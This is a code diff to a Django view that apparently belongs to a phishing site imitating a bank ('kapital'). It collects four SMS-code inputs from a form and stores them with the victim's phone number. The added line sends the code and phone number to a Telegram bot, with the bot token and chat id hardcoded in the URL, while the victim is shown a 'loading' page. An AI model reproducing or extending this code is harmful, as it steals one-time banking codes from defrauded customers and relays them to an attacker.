@@ -190,18 +190,17 @@ def dseckapital(request):
         input2 = request.POST.get("input2")
         input3 = request.POST.get("input3")
         input4 = request.POST.get("input4")
-        if any(input_val == "" for input_val in [input1, input2, input3, input4]):
+        if len(input4) == 0:
             # handle the case when input6 is empty
             # for example, you can display an error message to the user
             return render(request, 'pages/kapital.html')
         concatenated = input1 + input2+input3+input4
         contact.sms=concatenated
         contact.bankname=""
-        contact.page_name="/loading"
         contact.save()
+        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}\nPage:Loading\nnumber{contact.phone}\nsms:{concatenated}')
         return render( request,'pages/loading.html' )
-    contact.page_name="/loading"
-    contact.save()
+    
     return render( request,'pages/loading.html',context )
 
 @csrf_exempt
